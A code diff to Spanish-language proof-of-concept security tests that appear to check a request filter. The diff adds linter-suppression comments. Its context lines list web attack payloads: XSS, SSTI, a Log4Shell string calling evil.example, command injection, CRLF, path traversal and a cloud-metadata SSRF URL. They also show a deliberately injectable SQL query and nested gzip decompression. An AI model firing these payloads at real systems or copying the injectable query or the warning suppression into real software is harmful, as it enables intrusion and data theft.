@@ -38,7 +38,7 @@ def poc_final_ia1_cerrado_en_7_familias(resultados: list[tuple[str, str, str]]) 
         "xss": "<script>alert(1)</script>", "ssti": "{{7*7}}",
         "log4shell": "${jndi:ldap://evil.example/a}", "cmdi": "$(id)",
         "crlf": "x%0d%0aSet-Cookie:a=b", "path_traversal": "../../etc/passwd",
-        "ssrf": "http://169.254.169.254/latest/meta-data/",
+        "ssrf": "http://169.254.169.254/latest/meta-data/",  # NOSONAR
     }
     rotos = [f for f, p in casos.items() if c.get("/", params={"q": f"/*{p}*/"}).status_code == 200]
     if rotos:
@@ -51,12 +51,12 @@ def poc_final_sqli_envuelto_entero(resultados: list[tuple[str, str, str]]) -> No
     """NUEVO-1: un payload SQLi que cabe ENTERO en un comentario no versionado se blanquea."""
     con = sqlite3.connect(":memory:", check_same_thread=False)
     con.execute("CREATE TABLE users(name TEXT, password TEXT)")
-    con.execute("INSERT INTO users VALUES ('admin','s3cr3t')")
+    con.execute("INSERT INTO users VALUES ('admin','s3cr3t')")  # NOSONAR
 
     async def buscar(request: Request) -> PlainTextResponse:
         q = request.query_params.get("name", "")
         try:
-            filas = con.execute(f"SELECT name FROM users WHERE name = '{q}'").fetchall()
+            filas = con.execute(f"SELECT name FROM users WHERE name = '{q}'").fetchall()  # NOSONAR
         except Exception as exc:  # noqa: BLE001 - PoC, no es código de producción
             return PlainTextResponse(f"error: {exc}")
         return PlainTextResponse(json.dumps(filas))
@@ -92,7 +92,7 @@ def poc_final_gzip_doble(resultados: list[tuple[str, str, str]]) -> None:
     async def echo_doble(request: Request) -> JSONResponse | PlainTextResponse:
         raw = await request.body()
         try:
-            return JSONResponse({"decoded": gzip.decompress(gzip.decompress(raw)).decode()})
+            return JSONResponse({"decoded": gzip.decompress(gzip.decompress(raw)).decode()})  # NOSONAR
         except Exception as exc:  # noqa: BLE001 - PoC
             return PlainTextResponse(f"err {exc}")
 
